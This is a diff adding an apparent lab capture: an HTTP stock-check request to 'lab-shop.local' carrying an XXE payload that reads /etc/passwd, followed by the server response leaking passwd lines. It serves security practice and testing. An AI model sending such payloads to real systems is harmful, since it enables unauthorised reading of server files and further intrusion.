@@ -1,0 +1,17 @@
+POST /product/stock HTTP/1.1
+Host: lab-shop.local
+Content-Type: application/xml
+Cookie: session=<REDACTED_LAB_SESSION>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+
+=== RESPONSE ===
+HTTP/1.1 400 Bad Request
+Content-Type: application/json
+
+{"error": "Invalid product ID: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"}
